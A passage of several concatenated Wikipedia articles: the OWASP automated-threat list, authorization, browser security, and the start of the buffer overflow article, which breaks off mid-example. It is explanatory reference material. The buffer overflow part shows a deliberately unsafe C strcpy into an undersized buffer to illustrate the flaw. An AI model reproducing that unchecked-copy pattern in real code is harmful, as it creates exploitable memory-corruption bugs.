Technological unemployment


Jobless recovery


Post-work society


Threat





Trade shows and awards




ASP-DAC


DAC


DATE


IEEE Robotics and Automation Award


ICCAD




v
t
e


An 
automated threat
 is a type of computer security 
threat
 to a computer network or 
web application
, characterised by the malicious use of automated tools such as 
Internet bots
.
[
1
]
 Automated threats are popular on the internet as they can complete large amounts of repetitive tasks with almost no cost to execute.
[
2
]




Threat ontology
[
edit
]


The OWASP Automated Threat Handbook provides a threat ontology list for classifying automated threats, which are enumerated below.







Identity Code


Name


Defining characteristics





OAT-020


Account Aggregation


Use by an intermediary application that collects together multiple accounts

and interacts on their behalf







OAT-019


Account Creation


Create multiple accounts for subsequent misuse





OAT-003


Ad Fraud


False clicks and fraudulent display of web-placed advertisements





OAT-009


CAPTCHA Bypass


Solve anti-automation tests





OAT-001


Carding


Multiple payment authorisation attempts used to verify the validity of bulk

stolen payment card data







OAT-010


Card Cracking


Identify missing start/expiry dates and security codes for stolen payment card

data by trying different values







OAT-012


Cashing Out


Buy goods or obtain cash utilising validated stolen payment card or other user

account data







OAT-007


Credential Cracking


Identify valid login credentials by trying different values for usernames and/or

passwords







OAT-015


Denial of Service


Target resources of the application and database servers, or individual user

accounts, to achieve denial of service (DoS)







OAT-006


Expediting


Perform actions to hasten progress of usually slow, tedious or time-consuming

actions







OAT-004


Fingerprinting


Elicit information about the supporting software and framework types and

versions







OAT-018


Footprinting


Probe and explore application to identify its constituents and properties





OAT-005


Scalping


Obtain limited-availability and/or preferred goods/services by unfair methods





OAT-011


Scraping


Collect application content and/or other data for use elsewhere





OAT-016


Skewing


Repeated link clicks, page requests or form submissions intended to alter some

metric







OAT-013


Sniping


Last minute bid or offer for goods or services





OAT-017


Spamming


Malicious or questionable information addition that appears in public or

private content, databases or user messages







OAT-002


Token Cracking


Mass enumeration of coupon numbers, voucher codes, discount tokens, etc.





OAT-014


Vulnerability Scanning


Crawl and 
fuzz
 application to identify weaknesses and possible vulnerabilities



References
[
edit
]






^
 
Watson, Colin (2015-10-26). 
"OWASP Automated Threat Handbook"
 
(PDF)
. 
OWASP
. OWASP
. Retrieved 
2016-09-10
.




^
 
"Security Insights: Defending Against Automated Threats | SecurityWeek.Com"
. 
www.securityweek.com
. Retrieved 
2016-09-18
.














Retrieved from "
https://en.wikipedia.org/w/index.php?title=Automated_threat&oldid=1193070857
"


Categories
: 
Types of malware
Impact of automation











From Wikipedia, the free encyclopedia






Function of specifying access rights and privileges to resources


"Authorized" redirects here. For the 2007 Epsom Derby winner, see 
Authorized (horse)
.


"Authorization code" redirects here. For the code allowing internet domain name transfers, see 
Auth-Code
.




Authorization
 or 
authorisation
 (see 
spelling differences
) is the function of specifying rights/privileges for accessing resources, which is related to general 
information security
 and 
computer security
, and to 
IAM
 (Identity and Access Management) in particular.
[
1
]
 More formally, "to authorize" is to define an access policy during the configuration of systems and user accounts. For example, user accounts for 
human resources
 staff are typically configured with authorization for accessing employee records, and this policy gets formalized as access control rules in a computer system. Authorization must not be confused with access control. During usage, access control enforces the authorization policy by deciding whether access requests to resources from (
authenticated
) consumers shall be approved (granted) or disapproved (rejected).
[
2
]
 Resources include individual files or an item's 
data
, 
computer programs
, computer 
devices
 and functionality provided by 
computer applications
. Examples of consumers are computer users, computer 
software
 and other 
hardware
 on the computer.





Overview
[
edit
]


IAM
 consists the following two phases: the configuration phase where a user account is created and its corresponding access authorization policy is defined, and the usage phase where user authentication takes place followed by access control to ensure that the user/consumer only gets access to resources for which they are authorized. Hence, access control in 
computer
 systems and 
networks
 relies on access authorization specified during configuration.  

Most modern, multi-user operating systems include 
role-based access control
 (RBAC) where authorization is implicitly defined by the roles. 
User authentication
 is the process of verifying the 
identity
 of consumers. When an authenticated consumer tries to access a resource, the access control process checks that the consumer has been authorized to use that resource. Authorization is the responsibility of an 
authority
, such as a department manager, within the application domain, but is often delegated to a custodian such as a system administrator. Authorizations are expressed as access policies in some types of "policy definition application", e.g. in the form of an 
access control list
 or a 
capability
, or a policy administration point e.g. 
XACML
. On the basis of the "
principle of least privilege
": consumers should only be authorized to access whatever they need to do their jobs. Older and single user operating systems often had weak or non-existent authentication and access control systems.

"Anonymous consumers" or "guests", are consumers that have not been required to authenticate. They often have limited authorization. On a distributed system, it is often desirable to grant access without requiring a unique identity. Familiar examples of 
access tokens
 include keys, certificates and tickets: they grant access without proving identity.

Trusted consumers are often authorized for unrestricted access to resources on a system, but must be verified so that the access control system can make the access approval decision. "Partially trusted" and guests will often have restricted authorization in order to protect resources against improper access and usage. The access policy in some operating systems, by default, grant all consumers full access to all resources. Others do the opposite, insisting that the administrator explicitly authorizes a consumer to use each resource.

Even when access is controlled through a combination of authentication and 
access control lists
, the problems of maintaining the authorization data is not trivial, and often represents as much administrative burden as managing authentication credentials. It is often necessary to change or remove a user's authorization: this is done by changing or deleting the corresponding access rules on the system. Using 
atomic authorization
 is an alternative to per-system authorization management, where a 
trusted third party
 securely distributes authorization information.



Related interpretations
[
edit
]


Public policy
[
edit
]


In 
public policy
, authorization is a feature of trusted systems used for 
security
 or 
social control
.



Banking
[
edit
]


In 
banking
, an 
authorization
 is a hold placed on a customer's account when a purchase is made using a 
debit card
 or 
credit card
.



Publishing
[
edit
]


Further information: 
Official § Adjective
, and 
Unauthorized biography


In 
publishing
, sometimes public lectures and other freely available texts are published without the approval of the 
author
. These are called unauthorized texts. An example is the 2002 
 'The Theory of Everything: The Origin and Fate of the Universe' 
, which was collected from 
Stephen Hawking
's lectures and published without his permission as per copyright law.
[
citation needed
]




See also
[
edit
]








Look up 
authorization
 in Wiktionary, the free dictionary.






Access control


Authorization hold


Authorization OSID


Kerberos (protocol)


Multi-party authorization


OAuth


OpenID Connect


OpenID


Usability of web authentication systems


WebFinger


WebID


XACML




References
[
edit
]






^
 
Fraser, B. (1997), 
RFC 2196 – Site Security Handbook
, 
IETF




^
 
Jøsang, Audun (2017), 
A Consistent Definition of Authorization
, Proceedings of the 13th International Workshop on Security and Trust Management (STM 2017)






v
t
e
Information security
Related security categories


Computer security


Automotive security


Cybercrime


Cybersex trafficking


Computer fraud


Cybergeddon


Cyberterrorism


Cyberwarfare


Electromagnetic warfare


Information warfare


Internet security


Mobile security


Network security


Copy protection


Digital rights management


vectorial version
Threats


Adware


Advanced persistent threat


Arbitrary code execution


Backdoors


Bombs

Fork


Logic


Time


Zip


Hardware backdoors


Code injection


Crimeware


Cross-site scripting


Cross-site leaks


DOM clobbering


History sniffing


Cryptojacking


Botnets


Data breach


Drive-by download


Browser Helper Objects


Viruses


Data scraping


Denial-of-service attack


Eavesdropping


Email fraud


Email spoofing


Exploits


Fraudulent dialers


Hacktivism


Infostealer


Insecure direct object reference


Keystroke loggers


Malware


Payload


Phishing


Voice


Polymorphic engine


Privilege escalation


Ransomware


Rootkits


Scareware


Shellcode


Spamming


Social engineering


Spyware


Software bugs


Trojan horses


Hardware Trojans


Remote access trojans


Vulnerability


Web shells


Wiper


Worms


SQL injection


Rogue security software


Zombie


Defenses


Application security


Secure coding


Secure by default


Secure by design


Misuse case


Computer access control


Authentication


Multi-factor authentication


Authorization


Computer security software


Antivirus software


Security-focused operating system


Data-centric security


Obfuscation (software)


Data masking


Encryption


Firewall


Intrusion detection system


Host-based intrusion detection system
 (HIDS)


Anomaly detection


Information security management


Information risk management


Security information and event management
 (SIEM)


Runtime application self-protection


Site isolation




Authority control databases
: National 
Germany
Czech Republic










Retrieved from "
https://en.wikipedia.org/w/index.php?title=Authorization&oldid=1244197006
"


Categories
: 
Computer access control
Access control
Authority
Hidden categories: 
Articles with short description
Short description is different from Wikidata
Use dmy dates from March 2023
All articles with unsourced statements
Articles with unsourced statements from August 2021











From Wikipedia, the free encyclopedia






Application of internet security to web browsers




Browser security
 is the application of 
Internet security
 to 
web browsers
 in order to protect 
networked
 data and 
computer systems
 from breaches of privacy or 
malware
. Security exploits of 
browsers
 often use 
JavaScript
, sometimes with 
cross-site scripting
 (XSS)
[
1
]
 with a secondary payload using 
Adobe Flash
.
[
2
]
 Security exploits can also take advantage of 
vulnerabilities
 (security holes) that are commonly exploited in all 
browsers
 (including 
Google Chrome
,
[
3
]
 
Microsoft Internet Explorer
,
[
4
]
 
Mozilla Firefox
,
[
5
]
 
Opera
,
[
6
]
 and 
Safari
[
7
]
).





Security
[
edit
]


Web browsers can be breached in one or more of the following ways:



Operating system
 is breached and malware is reading/modifying the browser memory space in privilege mode
[
8
]


Operating system has a malware running as a background process, which is reading/modifying the browser memory space in privileged mode


Main browser executable can be hacked


Browser components may be hacked


Browser plugins can be hacked


Browser network communications could be intercepted outside the machine
[
9
]


The browser may not be aware of any of the breaches above and may show the user a safe connection is made.

Whenever a browser communicates with a website, the website, as part of that communication, collects some information about the browser (in order to process the formatting of the page to be delivered, if nothing else).
[
10
]
 If malicious code has been inserted into the website's content, or in a worst-case scenario, if that website has been specifically designed to host malicious code, then vulnerabilities specific to a particular browser can allow this malicious code to run processes within the browser application in unintended ways (and remember, one of the bits of information that a website collects from a browser communication is the browser's identity- allowing specific vulnerabilities to be exploited).
[
11
]
 Once an attacker is able to run processes on the visitor's machine, then exploiting known security vulnerabilities can allow the attacker to gain privileged access (if the browser isn't already running with privileged access) to the "infected" system in order to perform an even greater variety of malicious processes and activities on the machine or even the victim's whole network.
[
12
]


Breaches of web browser security are usually for the purpose of bypassing protections to display 
pop-up advertising
[
13
]
 collecting 
personally identifiable information
 (PII) for either 
Internet marketing
 or 
identity theft
, 
website tracking
 or 
web analytics
 about a user against their will using tools such as 
web bugs
, 
Clickjacking
, 
Likejacking
 (where 
Facebook
's 
like button
 is targeted),
[
14
]
[
15
]
[
16
]
[
17
]
 
HTTP cookies
, 
zombie cookies
 or 
Flash cookies
 (Local Shared Objects or LSOs);
[
2
]
 installing 
adware
, 
viruses
, 
spyware
 such as 
Trojan horses
 (to gain access to users' 
personal computers
 via 
cracking
) or other 
malware
 including 
online banking
 theft using 
man-in-the-browser
 attacks.

In depth study of vulnerabilities in Chromium web-browser indicates that, Improper Input Validation (CWE-20) and Improper Access Control (CWE-284) are the most occurring root causes for security vulnerabilities.
[
18
]
 Furthermore, among vulnerabilities examined at the time of this study, 106 vulnerabilities occurred in Chromium because of reusing or importing vulnerable versions of third party libraries.

Vulnerabilities in the web browser software itself can be minimized by keeping browser software updated,
[
19
]
 but will not be sufficient if the underlying operating system is compromised, for example, by a rootkit.
[
20
]
 Some subcomponents of browsers such as scripting, add-ons, and cookies
[
21
]
[
22
]
[
23
]
 are particularly vulnerable ("the 
confused deputy problem
") and also need to be addressed.

Following the principle of 
defence in depth
, a fully patched and correctly configured browser may not be sufficient to ensure that browser-related security issues cannot occur. For example, a 
rootkit
 can 
capture keystrokes
 while someone logs into a banking website, or carry out a 
man-in-the-middle
 attack by modifying network traffic to and from a web browser. 
DNS hijacking
 or 
DNS spoofing
 may be used to return false positives for mistyped website names, or to subvert search results for popular search engines. Malware such as 
RSPlug
 simply modifies a system's configuration to point at rogue DNS servers.

Browsers can use more secure methods of 
network communication
 to help prevent some of these attacks:



DNS
: 
DNSSec
 and 
DNSCrypt
, for example with non-default 
DNS servers
 such as 
Google Public DNS
 or 
OpenDNS
.


HTTP
: 
HTTP Secure
 and 
SPDY
 with digitally signed 
public key certificates
 or 
Extended Validation Certificates
.


Perimeter defenses, typically through firewalls and the use of 
filtering
 
proxy servers
 that block malicious websites and perform antivirus scans of any file downloads, are commonly implemented as a best practice in large organizations to block malicious network traffic before it reaches a browser.

The topic of browser security has grown to the point of spawning the creation of entire organizations, such as The Browser Exploitation Framework Project,
[
24
]
 creating platforms to collect tools to breach browser security, ostensibly in order to test browsers and network systems for vulnerabilities.



Plugins and extensions
[
edit
]


Although not part of the browser per se, browser 
plugins
 and 
extensions
 extend the 
attack surface
, exposing vulnerabilities in 
Adobe Flash Player
, 
Adobe (Acrobat) Reader
, 
Java plugin
, and 
ActiveX
 that are commonly exploited. Researchers
[
25
]
 have extensively studied the security architecture of various web-browsers in particular those relying on plug-and-play designs. This study has identified 16 common vulnerability types, and 19 potential mitigations. Malware may also be implemented as a browser extension, such as a 
browser helper object
 in the case of Internet Explorer.
[
26
]
 In various other exploits websites which were designed to look authentic and included rogue 'update Adobe Flash' popups designed as visual cues to download malware payloads in their place.
[
27
]
 Some browsers like 
Google Chrome
 and Mozilla 
Firefox
 can block—or warn users of—insecure plugins.



Adobe Flash
[
edit
]


Main article: 
Local shared object § Privacy concerns


An August 2009 study by the 
Social Science Research Network
 found that 50% of websites using Flash were also employing Flash cookies, yet privacy policies rarely disclosed them, and user controls for privacy preferences were lacking.
[
28
]
 Most browsers' 
cache
 and history delete functions do not affect Flash Player's writing Local Shared Objects to its own cache, and the user community is much less aware of the existence and function of Flash cookies than HTTP cookies.
[
29
]
 Thus, users having deleted HTTP cookies and purged browser history files and caches may believe that they have purged all tracking data from their computers while in fact Flash browsing history remains. As well as manual removal, the BetterPrivacy add-on for Firefox can remove Flash cookies.
[
2
]
 
Adblock Plus
 can be used to filter out specific threats
[
13
]
 and 
Flashblock
 can be used to give an option before allowing content on otherwise trusted sites.
[
30
]


Charlie Miller
 recommended "not to install Flash"
[
31
]
 at the 
computer security conference
 CanSecWest. Several other security experts also recommend to either not install Adobe Flash Player or to block it.
[
32
]




Password security model
[
edit
]


The contents of a web page are arbitrary and controlled by the entity owning the domain named displayed in the address bar. If 
HTTPS
 is used, then encryption is used to secure against attackers with access to the network from changing the page contents en route. When presented with a password field on a web page, a user is supposed to look at the address bar to determine whether the domain name in the address bar is the correct place to send the password.
[
33
]
 For example, for Google's single sign-on system (used on e.g. YouTube.com), the user should always check that the address bar says "https://accounts.google.com" before inputting their password.

An un-compromised browser guarantees that the address bar is correct. This guarantee is one reason why browsers will generally display a warning when entering fullscreen mode, on top of where the address bar would normally be, so that a fullscreen website cannot make a fake browser user interface with a fake address bar.
[
34
]




Browser hardening
[
edit
]


Browsing the Internet as a 
least-privilege
 user account (i.e. without administrator privileges) limits the ability of a security exploit in a web browser from compromising the whole operating system.
[
35
]


Internet Explorer 4
 and later allows the blocklisting
[
36
]
[
37
]
[
38
]
 and allowlisting
[
39
]
[
40
]
 of 
ActiveX
 controls, add-ons and browser extensions in various ways.

Internet Explorer 7
 added "protected mode", a technology that hardens the browser through the application of a security sandboxing feature of 
Windows Vista
 called 
Mandatory Integrity Control
.
[
41
]


Google Chrome
 provides a 
sandbox
 to limit web page access to the operating system.
[
42
]


Suspected malware sites reported to Google,
[
43
]
 and confirmed by Google, are flagged as hosting malware in certain browsers.
[
44
]


There are third-party extensions and plugins available to 
harden
 even the latest browsers,
[
45
]
 and some for older browsers and operating systems. 
Whitelist
-based software such as 
NoScript
 can block 
JavaScript
 and Adobe Flash which is used for most attacks on privacy, allowing users to choose only sites they know are safe – 
AdBlock Plus
 also uses whitelist 
ad filtering
 rules subscriptions, though both the software itself and the filtering list maintainers have come under controversy for by-default allowing some sites to pass the pre-set filters.
[
46
]
 The 
US-CERT
 recommends to block 
Flash
 using 
NoScript
.
[
47
]




Fuzzing
[
edit
]


Modern web browsers undergo extensive 
fuzzing
 to uncover vulnerabilities. The 
Chromium
 code of 
Google Chrome
 is continuously fuzzed by the Chrome Security Team with 15,000 cores.
[
48
]
 For 
Microsoft Edge
 and 
Internet Explorer
, 
Microsoft
 performed fuzzed testing with 670 machine-years during product development, generating more than 400 billion DOM manipulations from 1 billion HTML files.
[
49
]
[
48
]




See also
[
edit
]


Filter bubble


Frame injection


Identity driven networking


Internet safety


Network security policy


Application security


References
[
edit
]






^
 
Maone, Giorgio
. 
"NoScript :: Add-ons for Firefox"
. 
Mozilla Add-ons
. 
Mozilla Foundation
.




^ 
a
 
b
 
c
 
"BetterPrivacy :: Add-ons for Firefox"
. 
Mozilla Foundation
.
[
permanent dead link
]




^
 
Messmer, Ellen and NetworkWorld. 
"Google Chrome Tops 'Dirty Dozen' Vulnerable Apps List"
[
permanent dead link
]
. Retrieved 19 November 2010.




^
 
Bradly, Tony. 
"It's Time to Finally Drop Internet Explorer 6" 
 
Archived
 15 October 2012 at the 
Wayback Machine
. Retrieved 19 November 2010.




^
 
Keizer, Greg. 
Firefox 3.5 Vulnerability Confirmed
 
Archived
 28 October 2010 at the 
Wayback Machine
. Retrieved 19 November 2010.




^
 
Skinner, Carrie-Ann. 
Opera Plugs "Severe" Browser Hole
 
Archived
 20 May 2009 at the 
Wayback Machine
. Retrieved 19 November 2010.




^
 
"Browser"
. 
Mashable
. 
Archived
 from the original on 2 September 2011
. Retrieved 
2 September
 2011
.




^
 
Smith, Dave (21 March 2013). 
"The Yontoo Trojan: New Mac OS X Malware Infects Google Chrome, Firefox And Safari Browsers Via Adware"
. IBT Media Inc. 
Archived
 from the original on 24 March 2013
. Retrieved 
21 March
 2013
.




^
 
Goodin, Dan. 
"MySQL.com breach leaves visitors exposed to malware"
. 
The Register
. 
Archived
 from the original on 28 September 2011
. Retrieved 
26 September
 2011
.




^
 
Clinton Wong. 
"HTTP Transactions"
. O'Reilly. Archived from 
the original
 on 13 June 2013.




^
 
"9 Ways to Know Your PC is Infected with Malware"
. Archived from 
the original
 on 11 November 2013.




^
 
"Symantec Security Response Whitepapers"
. Archived from 
the original
 on 9 June 2013.




^ 
a
 
b
 
Palant, Wladimir
. 
"Adblock Plus :: Add-ons for Firefox"
. 
Mozilla Add-ons
. 
Mozilla Foundation
.




^
 
"Facebook privacy probed over 'like,' invitations"
. CBC News. 23 September 2010. 
Archived
 from the original on 26 June 2012
. Retrieved 
24 August
 2011
.




^
 
Albanesius, Chloe (19 August 2011). 
"German Agencies Banned From Using Facebook, 'Like' Button"
. 
PC Magazine
. 
Archived
 from the original on 29 March 2012
. Retrieved 
24 August
 2011
.




^
 
McCullagh, Declan
 (2 June 2010). 
"Facebook 'Like' button draws privacy scrutiny"
. 
CNET News
. 
Archived
 from the original on 5 December 2011
. Retrieved 
19 December
 2011
.




^
 
Roosendaal, Arnold (30 November 2010). "Facebook Tracks and Traces Everyone: Like This!". 
SSRN
 
1717563
.




^
 
Santos, J. C. S.; Peruma, A.; Mirakhorli, M.; Galstery, M.; Vidal, J. V.; Sejfia, A. (April 2017). 
"Understanding Software Vulnerabilities Related to Architectural Security Tactics: An Empirical Investigation of Chromium, PHP and Thunderbird"
. 
2017 IEEE International Conference on Software Architecture (ICSA)
. pp. 69–78. 
doi
:
10.1109/ICSA.2017.39
. 
ISBN
 
978-1-5090-5729-0
. 
S2CID
 
29186731
.




^
 
State of Vermont. 
"Web Browser Attacks"
. Archived from 
the original
 on 13 February 2012
. Retrieved 
11 April
 2012
.




^
 
"Windows Rootkit Overview"
 
(PDF)
. Symantec. Archived from 
the original
 
(PDF)
 on 16 May 2013
. Retrieved 
20 April
 2013
.




^
 
"Cross Site Scripting Attack"
. 
Archived
 from the original on 15 May 2013
. Retrieved 
20 May
 2013
.




^
 
Lenny Zeltser. 
"Mitigating Attacks on the Web Browser and Add-Ons"
. 
Archived
 from the original on 7 May 2013
. Retrieved 
20 May
 2013
.




^
 
Dan Goodin (14 March 2013). 
"Two new attacks on SSL decrypt authentication cookies"
. 
Archived
 from the original on 15 May 2013
. Retrieved 
20 May
 2013
.




^
 
"beefproject.com"
. 
Archived
 from the original on 11 August 2011.




^
 
Santos, Joanna C. S.; Sejfia, Adriana; Corrello, Taylor; Gadenkanahalli, Smruthi; Mirakhorli, Mehdi (2019). 
"Achilles' heel of plug-and-Play software architectures: A grounded theory based approach"
. 
Proceedings of the 2019 27th ACM Joint Meeting on European Software Engineering Conference and Symposium on the Foundations of Software Engineering
. ESEC/FSE 2019. New York, NY, US: ACM. pp. 671–682. 
doi
:
10.1145/3338906.3338969
. 
ISBN
 
978-1-4503-5572-8
. 
S2CID
 
199501995
.




^
 
"How to Create a Rule That Will Block or Log Browser Helper Objects in Symantec Endpoint Protection"
. Symantec.com. Archived from 
the original
 on 14 May 2013
. Retrieved 
12 April
 2012
.




^
 
Aggarwal, Varun (30 April 2021). 
"Breaking: Fake sites of 50 Indian News portals luring gullible readers"
. 
The Economic Times CIO
. 
Archived
 from the original on 26 February 2023
. Retrieved 
26 February
 2023
.




^
 
Soltani, Ashkan; Canty, Shannon; Mayo, Quentin; Thomas, Lauren; Hoofnagle, Chris Jay (10 August 2009). "Soltani, Ashkan, Canty, Shannon, Mayo, Quentin, Thomas, Lauren and Hoofnagle, Chris Jay: Flash Cookies and Privacy". 
SSRN
 
1446862
.




^
 
"Local Shared Objects -- "Flash Cookies"
"
. Electronic Privacy Information Center. 21 July 2005. 
Archived
 from the original on 16 April 2010
. Retrieved 
8 March
 2010
.




^
 
Chee, Philip
. 
"Flashblock :: Add-ons for Firefox"
. 
Mozilla Add-ons
. 
Mozilla Foundation
. Archived from 
the original
 on 15 April 2013.




^
 
"Pwn2Own 2010: interview with Charlie Miller"
. 1 March 2010. Archived from 
the original
 on 24 April 2011
. Retrieved 
27 March
 2010
.




^
 
"Expert says Adobe Flash policy is risky"
. 12 November 2009. 
Archived
 from the original on 26 April 2011
. Retrieved 
27 March
 2010
.




^
 
John C. Mitchell
. 
"Browser Security Model"
 
(PDF)
. 
Archived
 
(PDF)
 from the original on 20 June 2015.




^
 
"Using the HTML5 Fullscreen API for Phishing Attacks » Feross.org"
. 
feross.org
. 
Archived
 from the original on 25 December 2017
. Retrieved 
7 May
 2018
.




^
 
"Using a Least-Privileged User Account"
. 
Microsoft
. 29 June 2009. 
Archived
 from the original on 6 March 2013
. Retrieved 
20 April
 2013
.




^
 
"How to Stop an ActiveX control from running in Internet Explorer"
. 
Microsoft
. 
Archived
 from the original on 2 December 2014
. Retrieved 
22 November
 2014
.




^
 
"Internet Explorer security zones registry entries for advanced users"
. 
Microsoft
. 
Archived
 from the original on 2 December 2014
. Retrieved 
22 November
 2014
.




^
 
"Out-of-date ActiveX control blocking"
. 
Microsoft
. 
Archived
 from the original on 29 November 2014
. Retrieved 
22 November
 2014
.




^
 
"Internet Explorer Add-on Management and Crash Detection"
. 
Microsoft
. 8 October 2009. 
Archived
 from the original on 29 November 2014
. Retrieved 
22 November
 2014
.




^
 
"How to Manage Internet Explorer Add-ons in Windows XP Service Pack 2"
. 
Microsoft
. 
Archived
 from the original on 2 December 2014
. Retrieved 
22 November
 2014
.




^
 
Matthew Conover. 
"Analysis of the Windows Vista Security Model"
 
(PDF)
. 
Symantec Corporation
. Archived from 
the original
 
(PDF)
 on 16 May 2008
. Retrieved 
8 October
 2007
.




^
 
"Browser Security: Lessons from Google Chrome"
. August 2009. 
Archived
 from the original on 11 November 2013.




^
 
"Report malicious software (URL) to Google"
. 
Archived
 from the original on 12 September 2014.




^
 
"Google Safe Browsing"
. 
Archived
 from the original on 14 September 2014.




^
 
"5 Ways to Secure Your Web Browser"
. 
ZoneAlarm
. 8 May 2014. 
Archived
 from the original on 7 September 2014.




^
 
"Adblock Plus Will Soon Block Fewer Ads – SiliconFilter"
. Siliconfilter.com. 12 December 2011. 
Archived
 from the original on 30 January 2013
. Retrieved 
20 April
 2013
.




^
 
"Securing Your Web Browser"
. 
Archived
 from the original on 26 March 2010
. Retrieved 
27 March
 2010
.




^ 
a
 
b
 
Sesterhenn, Eric; Wever, Berend-Jan; Orrù, Michele; Vervier, Markus (19 September 2017). 
"Browser Security WhitePaper"
 
(PDF)
. X41D SEC GmbH. 
Archived
 
(PDF)
 from the original on 1 February 2022
. Retrieved 
31 August
 2018
.




^
 
"Security enhancements for Microsoft Edge (Microsoft Edge for IT Pros)"
. 
Microsoft
. 15 October 2017. 
Archived
 from the original on 1 September 2018
. Retrieved 
31 August
 2018
.






Further reading
[
edit
]


Sesterhenn, Eric; Wever, Berend-Jan; Orrù, Michele; Vervier, Markus (19 September 2017). 
"Browser Security White Paper"
 
(PDF)
. X41D SEC GmbH.


Heiderich, Mario; Inführ, Alex; Fäßler, Fabian; Krein, Nikolai; Kinugawa, Masato (29 November 2017). 
"Cure53 Browser Security White Paper"
 
(PDF)
. Cure53.


v
t
e
Web browsers


Features


standards


protocols


Features


Bookmarks


Extensions


Privacy mode


Web standards


HTML


v5


CSS


DOM


JavaScript


WebAssembly


Web storage


IndexedDB


WebGL


WebGPU


Protocols


HTTP


Encryption


Cookies


third-party


OCSP


WebRTC


WebSocket


Active
Blink
-based


Google Chrome


Chromium


Arc


Avast


Brave


Coc Coc


Comodo


Dooble


Epic


Falkon


Maxthon


Microsoft Edge


Opera
 (
Mobile
)


Otter


Puffin 


QQ


Samsung Internet


Silk


Sleipnir


SRWare


Supermium


UC


ungoogled


Vivaldi


Whale


Yandex


Gecko
-based


Firefox


Floorp


GNU IceCat


LibreWolf


Midori


SlimBrowser


Tor Browser


Gecko 
forks


Basilisk


K-Meleon


Pale Moon


SeaMonkey


Waterfox


WebKit
-based


Safari


GNOME Web


iCab


Orion


Multi-
engine


360


DuckDuckGo


Konqueror


Lunascape


NetFront


qutebrowser


Other


eww


Flow


Ladybird


Links


Lynx


NetSurf


Opera Mini


w3m


Discontinued
Blink
-based


Beaker


Citrio


Flock


Redcore


Rockmelt


SalamWeb


Sputnik


Torch


Gecko
-based


Beonex


Camino


Classilla


Conkeror


Firefox Lite


Galeon


Ghostzilla


IceDragon


Kazehakase


Kylo


Lotus


MicroB


Minimo


Mozilla suite


PirateBrowser


Pogo


Strata


Swiftfox


Swiftweasel


TenFourFox


Timberwolf


xB


MSHTML
-based


Internet Explorer


AOL


Deepnet


GreenBrowser


MediaBrowser


NeoPlanet


NetCaptor


SpaceTime


ZAC


WebKit
-based


Arora


BOLT


Dolphin


Fluid


Google TV


Iris


Mercury


Nokia Symbian


OmniWeb


Opera Coast


Origyn


QtWeb


Shiira


Steel


surf


Uzbl


WebPositive


xombrero


Other


abaco


Amaya


Arachne


Arena


Blazer


Cake


Charon


CM


Deepfish


Dillo


Edge Legacy


ELinks


Gazelle


HotJava


IBM Home Page Reader


IBM WebExplorer


IBrowse


Internet Explorer for Mac


KidZui


Line Mode


Mosaic


MSN TV


NetPositive


Netscape


Skweezer


Skyfire


ThunderHawk


Vision


WinWAP


WorldWideWeb




Category


Comparisons


List




v
t
e
Malware
 topics
Infectious malware


Comparison of computer viruses


Computer virus


Computer worm


List of computer worms


Timeline of computer viruses and worms


Concealment


Backdoor


Clickjacking


Man-in-the-browser


Man-in-the-middle


Rootkit


Trojan horse


Zombie computer


Malware for profit


Adware


Botnet


Crimeware


Fleeceware


Form grabbing


Fraudulent dialer


Infostealer


Keystroke logging


Malbot


Privacy-invasive software


Ransomware


Rogue security software


Scareware


Spyware


Web threats


By operating system


Android malware


Classic Mac OS viruses


iOS malware


Linux malware


MacOS malware


Macro virus


Mobile malware


Palm OS viruses


HyperCard viruses


Protection


Anti-keylogger


Antivirus software


Browser security


Data loss prevention software


Defensive computing


Firewall


Internet security


Intrusion detection system


Mobile security


Network security


Countermeasures


Computer and network surveillance


Honeypot


Operation: Bot Roast












Retrieved from "
https://en.wikipedia.org/w/index.php?title=Browser_security&oldid=1243731461
"


Categories
: 
Web browsers
Web security exploits
Internet security
Hidden categories: 
All articles with dead external links
Articles with dead external links from June 2019
Articles with permanently dead external links
Articles with dead external links from May 2023
Webarchive template wayback links
Articles with short description
Short description matches Wikidata
Use dmy dates from August 2024











From Wikipedia, the free encyclopedia






Anomaly in computer security and programming


Visualization of a software buffer overflow. Data is written into A, but is too large to fit within A, so it 
overflows
 into B.


In 
programming
 and 
information security
, a 
buffer overflow
 or 
buffer overrun
 is an 
anomaly
 whereby a 
program
 writes 
data
 to a 
buffer
 beyond the buffer's 
allocated memory
, overwriting adjacent 
memory
 locations.

Buffers are areas of memory set aside to hold data, often while moving it from one section of a program to another, or between programs. Buffer overflows can often be triggered by malformed inputs; if one assumes all inputs will be smaller than a certain size and the buffer is created to be that size, then an anomalous transaction that produces more data could cause it to write past the end of the buffer. If this overwrites adjacent data or executable code, this may result in erratic program behavior, including 
memory access errors
, incorrect results, and 
crashes
.

Exploiting the behavior of a buffer overflow is a well-known 
security exploit
. On many systems, the memory layout of a program, or the system as a whole, is well defined. By sending in data designed to cause a buffer overflow, it is possible to write into areas known to hold 
executable code
 and replace it with 
malicious code
, or to selectively overwrite data pertaining to the program's state, therefore causing behavior that was not intended by the original programmer. Buffers are widespread in 
operating system
 (OS) code, so it is possible to make attacks that perform 
privilege escalation
 and gain unlimited access to the computer's resources. The famed 
Morris worm
 in 1988 used this as one of its attack techniques.

Programming languages
 commonly associated with buffer overflows include 
C
 and 
C++
, which provide no built-in protection against accessing or overwriting data in any part of memory and do not automatically check that data written to an 
array
 (the built-in buffer type) is within the boundaries of that array. 
Bounds checking
 can prevent buffer overflows, but requires additional code and processing time. Modern operating systems use a variety of techniques to combat malicious buffer overflows, notably by 
randomizing the layout of memory
, or deliberately leaving space between buffers and looking for actions that write into those areas ("canaries").





Technical description
[
edit
]


A buffer overflow occurs when 
data
 written to a buffer also corrupts data values in 
memory addresses
 adjacent to the destination buffer due to insufficient 
bounds checking
.
[
1
]
: 41 
 This can occur when copying data from one buffer to another without first checking that the data fits within the destination buffer.



Example
[
edit
]


Further information on stack-based overflows: 
Stack buffer overflow


In the following example expressed in 
C
, a program has two variables which are adjacent in memory: an 8-byte-long string buffer, A, and a two-byte 
big-endian
 integer, B.



char
           
A
[
8
]
 
=
 
""
;


unsigned
 
short
 
B
    
=
 
1979
;




Initially, A contains nothing but zero bytes, and B contains the number 1979.







variable name



A



B





value



[
null string
]



1979





hex value



00


00


00


00


00


00


00


00




07


BB




Now, the program attempts to store the 
null-terminated string
 
"excessive"
 with 
ASCII
 encoding in the A buffer.



strcpy
(
A
,
 
"excessive"
);




"excessive"
 is 9 characters long and encodes to 10 bytes including the null terminator, but A can take only 8 bytes. By failing to check the length of the string, it also overwrites the value of B:







variable name



A



B





value



'e'


'x'


'c'


